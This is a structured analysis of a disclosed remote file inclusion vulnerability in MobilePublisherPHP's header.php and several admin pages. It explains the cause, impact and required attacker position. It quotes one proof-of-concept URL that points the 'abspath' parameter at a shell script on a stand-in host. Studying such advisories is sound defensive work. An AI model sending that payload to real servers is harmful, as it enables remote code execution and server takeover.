Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause of Vulnerability:**
- The vulnerability lies in the way the `header.php` file in MobilePublisherPHP handles the `abspath` parameter. Specifically, the `require $abspath."/functions.php";` line allows an attacker to specify a remote URL via the `abspath` parameter which is then included.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application includes a file specified by user input, without proper sanitization, leading to arbitrary code execution.
- The use of `require` statement on a user controlled variable.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious PHP file, the attacker can execute arbitrary code on the server, potentially leading to complete system compromise.

**Attack Vectors:**
- The `abspath` parameter in `header.php` is the primary attack vector.
- Attackers can manipulate the `abspath` parameter in the URL of the following files:
   - `/header.php`

**Required Attacker Capabilities/Position:**
- The attacker needs the ability to send HTTP requests to the vulnerable server with a modified URL parameter (specifically `abspath`).
- No prior authentication is needed.
- The attacker needs to have access to a web server where they can host a malicious php file.

**Additional Details:**
- The vulnerability was discovered by Timq.
- The vulnerability is present in MobilePublisherPHP version 1.5 RC2 and likely in prior versions.
- The provided proof of concept shows that  `http://site.com/[dir]/header.php?abspath=http://site.com/shell.php?`  is an exploit.
- The mailing list content also refers to the vulnerability in the following administrative pages which are vulnerable via the `auth_method` parameter:
    - `admin/index.php`
    - `admin/list.php`
    - `admin/postreview.php`
    - `admin/reindex.php`
    - `admin/sections.php`
    - `admin/templates.php`
    - `admin/userinfo.php`
    - `admin/users.php`
    - `admin/view.php`
